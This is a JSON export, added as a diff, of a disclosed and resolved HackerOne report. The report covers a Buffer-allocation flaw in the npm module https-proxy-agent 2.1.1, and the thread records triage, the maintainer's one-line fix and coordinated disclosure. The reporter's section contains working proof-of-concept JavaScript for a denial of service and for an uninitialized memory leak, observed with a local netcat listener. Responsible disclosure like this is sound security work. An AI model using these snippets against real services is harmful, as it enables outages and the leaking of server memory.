@@ -1,0 +1,644 @@
+{
+  "id": 319532,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTk1MzI=",
+  "url": "https://hackerone.com/reports/319532",
+  "title": "`https-proxy-agent` passes unsanitized options to Buffer(arg), resulting in DoS and uninitialized memory leak",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2018-02-25T12:56:44.574Z",
+  "submitted_at": "2018-02-25T12:56:44.574Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "chalker",
+    "url": "/chalker",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-04-02T20:49:07.192Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-03-03T20:48:53.761Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report a Buffer allocation vulnerability in `https-proxy-agent`.\n\nIn setups where `auth` argument is user-controlled, it allows to:\n1. cause Denial of Service by trivially consuming all the available CPU resources\n2. extract uninitialized memory chunks from the server on Node.js <8.x.\n\n# Module\n\n**module name:** https-proxy-agent\n**version:** 2.1.1 \n**npm page:** `https://www.npmjs.com/package/https-proxy-agent`\n\n## Module Description\n\n> This module provides an http.Agent implementation that connects to a specified HTTP or HTTPS proxy server, and can be used with the built-in https module.\n\n## Module Stats\n\n114 304 downloads in the last day\n1 668 955 downloads in the last week\n6 758 891 downloads in the last month\n\n~81 106 692 estimated downloads per year\n\n# Vulnerability\n\n## Vulnerability Description\n\n`https-proxy-agent` passes `auth` option to the Buffer constructor without proper sanitization, resulting in DoS and uninitialized memory leak in setups where an attacker could submit typed input to the 'auth' parameter (e.g. JSON).\n\nThe exact line: https://github.com/TooTallNate/node-https-proxy-agent/blob/2.1.1/index.js#L207\n\n## Steps To Reproduce:\n\n### DoS\n```js\nvar url = require('url');\nvar https = require('https');\nvar HttpsProxyAgent = require('https-proxy-agent');\n\nvar proxy = {\n  protocol: 'http:',\n  host: \"127.0.0.1\",\n  port: 8080\n};\n\nsetInterval(() => {\n  proxy.auth = 1e9; // a number as 'auth'\n  var opts = url.parse('https://example.com/');\n  var agent = new HttpsProxyAgent(proxy);\n  opts.agent = agent;\n  console.time('tick');\n  https.get(opts);\n  console.timeEnd('tick');\n}, 200);\n```\n\nObserve how this is consuming memory and CPU — each request takes >1 second in the main thread on my setup.\n\n### Uninitialized memory leak\n\n```js\n// listen with: nc -l -p 8080\n\nvar url = require('url');\nvar https = require('https');\nvar HttpsProxyAgent = require('https-proxy-agent');\n\nvar proxy = {\n  protocol: 'http:',\n  host: \"127.0.0.1\",\n  port: 8080\n};\n\nproxy.auth = 500; // a number as 'auth'\nvar opts = url.parse('https://example.com/');\nvar agent = new HttpsProxyAgent(proxy);\nopts.agent = agent;\nhttps.get(opts);\n```\n\nListen with `nl -l -p 8080` to see requests.\n\nExecute on various Node.js versions — 4.x LTS, 6.x LTS, 8.x LTS / 9.x.\n\nThis leaks uninitialized Buffer memory on Node.js <8.x.\nOn ≥8.x those Buffers (that are using the deprecated API) are zero-filled.\n\n## Supporting Material/References:\n\n- OS: Arch Linux current\n- Node.js 9.5.0\n- npm 5.6.0\n- gnu-netcat 0.7.1\n\n# Wrap up\n\n- I contacted the maintainer to let him know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nDenial of service\nSensitive data leak (on Node.js <8.0)",
+  "weakness": {
+    "id": 48,
+    "name": "Denial of Service"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2018-04-02T20:48:53.836Z",
+  "allow_singular_disclosure_after": -172753511.30891532,
+  "singular_disclosure_allowed": true,
+  "vote_count": 6,
+  "voters": [
+    "bagipro",
+    "bl4de",
+    "trainzment",
+    "apapedulimu",
+    "eveeez",
+    "japz"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.2,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "low",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 6412,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https-proxy-agent",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 2432880,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-26T07:45:43.448Z",
+      "updated_at": "2018-02-26T07:45:43.448Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2432896,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-26T07:49:44.317Z",
+      "updated_at": "2018-02-26T07:49:44.317Z",
+      "additional_data": {
+        "old_severity": "Medium",
+        "new_severity": "Medium (4.5)",
+        "old_severity_id": 122405,
+        "new_severity_id": 122579
+      },
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2432898,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ChangedScope",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-02-26T07:50:33.958Z",
+      "updated_at": "2018-02-26T07:50:33.958Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "old_scope": "Other module",
+      "new_scope": "https-proxy-agent",
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2452792,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@chalker since it's been a few days with no response from the maintainers I want to reach out through a generic security issue on the report and ask them to join the conversation.",
+      "automated_response": false,
+      "created_at": "2018-03-03T11:09:08.471Z",
+      "updated_at": "2018-03-03T11:09:08.471Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2452838,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@lirantal by my experience, pinging people over twitter often helps.",
+      "automated_response": false,
+      "created_at": "2018-03-03T11:48:48.614Z",
+      "updated_at": "2018-03-03T11:48:48.614Z",
+      "actor": {
+        "username": "chalker",
+        "cleared": false,
+        "verified": false,
+        "url": "/chalker",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453356,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ExternalUserJoined",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-03-03T18:41:58.439Z",
+      "updated_at": "2018-03-03T18:41:58.439Z",
+      "actor": {
+        "username": "nrajlich",
+        "cleared": false,
+        "verified": false,
+        "url": "/nrajlich",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453357,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "It's really hard locating people's contact details, whether that's an e-mail or twitter user.\nI sent an invite to another e-mail address associated with Nathan's account, let's see if it works otherwise I'll open an issue.",
+      "automated_response": false,
+      "created_at": "2018-03-03T18:42:25.497Z",
+      "updated_at": "2018-03-03T18:42:25.497Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453369,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "nathan@tootallnate.net n@n8.io https://twitter.com/TooTallNate — those are high-confidence, so should be safe.\n\n*nathan@tootallnate.net is listed in that specific package, n@n8.io — on github, tootallnate.net redirects to n8.io, github links to n8.io, n8.io links to https://twitter.com/TooTallNate*\n\nI tried to DM him over Twitter.",
+      "automated_response": false,
+      "created_at": "2018-03-03T18:48:27.527Z",
+      "updated_at": "2018-03-03T18:48:27.527Z",
+      "actor": {
+        "username": "chalker",
+        "cleared": false,
+        "verified": false,
+        "url": "/chalker",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453370,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey there, thanks for the report.\n\n```diff\ndiff --git a/index.js b/index.js\nindex 6998578..4e00712 100644\n--- a/index.js\n+++ b/index.js\n@@ -204,7 +204,7 @@ HttpsProxyAgent.prototype.callback = function connect(req, opts, fn) {\n   var headers = Object.assign({}, proxy.headers);\n   if (proxy.auth) {\n     headers['Proxy-Authorization'] =\n-      'Basic ' + new Buffer(proxy.auth).toString('base64');\n+      'Basic ' + Buffer.from(proxy.auth).toString('base64');\n   }\n\n   // the Host header should only include the port\n```\n\nHow does this look to you guys?",
+      "automated_response": false,
+      "created_at": "2018-03-03T18:50:37.163Z",
+      "updated_at": "2018-03-03T18:50:37.163Z",
+      "actor": {
+        "username": "nrajlich",
+        "cleared": false,
+        "verified": false,
+        "url": "/nrajlich",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453378,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey Nathan, thanks for jumping in.\n",
+      "automated_response": false,
+      "created_at": "2018-03-03T18:57:38.404Z",
+      "updated_at": "2018-03-03T18:57:38.404Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453398,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@nrajlich That should fix the issue.\nNote that without polyfills, it will change the supported Node.js version range — `Buffer.from` is present in Node.js `>=4.5.0 <5.0.0 | >=5.10.0`.\n\nI wouldn't care about it, though — 5.x. is long dead, 4.5.0 is also quite old, and the whole 4.x branch will be out of support in about two months. So yes, the change looks good to me.",
+      "automated_response": false,
+      "created_at": "2018-03-03T19:12:55.159Z",
+      "updated_at": "2018-03-03T19:13:27.982Z",
+      "actor": {
+        "username": "chalker",
+        "cleared": false,
+        "verified": false,
+        "url": "/chalker",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453429,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Ok `https-proxy-agent@2.2.0` has been published with the above patch applied. Let me know if you guys need anything else.",
+      "automated_response": false,
+      "created_at": "2018-03-03T19:35:11.796Z",
+      "updated_at": "2018-03-03T19:35:11.796Z",
+      "actor": {
+        "username": "nrajlich",
+        "cleared": false,
+        "verified": false,
+        "url": "/nrajlich",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453571,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@nrajlich Also see the other report, similar to this one ;-)",
+      "automated_response": false,
+      "created_at": "2018-03-03T20:46:24.637Z",
+      "updated_at": "2018-03-03T20:46:24.637Z",
+      "actor": {
+        "username": "chalker",
+        "cleared": false,
+        "verified": false,
+        "url": "/chalker",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453572,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@nrajlich Btw — thanks for confiming the patch here before doing the release!",
+      "automated_response": false,
+      "created_at": "2018-03-03T20:47:02.672Z",
+      "updated_at": "2018-03-03T20:47:02.672Z",
+      "actor": {
+        "username": "chalker",
+        "cleared": false,
+        "verified": false,
+        "url": "/chalker",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453574,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@chalker @nrajlich let's wait a week or two for the new version to be consumed by clients before we release the report. makes sense?\nand are you both ok with a full public disclosure?",
+      "automated_response": false,
+      "created_at": "2018-03-03T20:48:15.031Z",
+      "updated_at": "2018-03-03T20:48:15.031Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453575,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-03-03T20:48:29.117Z",
+      "updated_at": "2018-03-03T20:48:29.117Z",
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "chalker",
+        "url": "/chalker"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453576,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-03-03T20:48:53.791Z",
+      "updated_at": "2018-03-03T20:48:53.791Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2453588,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@lirantal I'm ok with public disclosure of this report. And any other (after the fix is released) unless stated otherwise). A week (or two) looks fine to me.",
+      "automated_response": false,
+      "created_at": "2018-03-03T21:02:34.391Z",
+      "updated_at": "2018-03-03T21:02:34.391Z",
+      "actor": {
+        "username": "chalker",
+        "cleared": false,
+        "verified": false,
+        "url": "/chalker",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2461382,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportSeverityUpdated",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-03-05T20:05:59.020Z",
+      "updated_at": "2018-03-05T20:05:59.020Z",
+      "additional_data": {
+        "old_severity": "Medium (4.5)",
+        "new_severity": "High (8.2)",
+        "old_severity_id": 122579,
+        "new_severity_id": 125656
+      },
+      "actor": {
+        "username": "lirantal",
+        "cleared": false,
+        "verified": false,
+        "url": "/lirantal",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/096/045/7e9d9170c9862d8d3697b11b0bb7160d40444c16_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 2556322,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2018-04-02T20:49:07.366Z",
+      "updated_at": "2018-04-02T20:49:07.366Z",
+      "actor": {
+        "url": "/nodejs-ecosystem",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Node.js third-party modules"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 6756,
+      "category": "researcher",
+      "content": "Unguarded `Buffer(arg)` in `auth` option, which can leak data or cause DoS if typed user input (e.g. from JSON) ends up there.\nResolved in `https-proxy-agent@2.2.0` by switching to `Buffer.from(arg)` (new Buffer API). ",
+      "user": {
+        "id": 68907,
+        "username": "chalker",
+        "name": "Nikita Skovoroda",
+        "bio": "",
+        "cleared": false,
+        "verified": false,
+        "website": "https://github.com/ChALkeR",
+        "location": "",
+        "created_at": "2016-04-12T21:43:38.517Z",
+        "url": "https://hackerone.com/chalker",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/000/068/907/abd483931dad2c93e376707dd59719cc277309cd_original.png/60f411638706d89ae3052af6fe8b88fa9a798e291deee40f6a22e81418d78d5f"
+        }
+      },
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [
+
+      ]
+    }
+  ]
+}
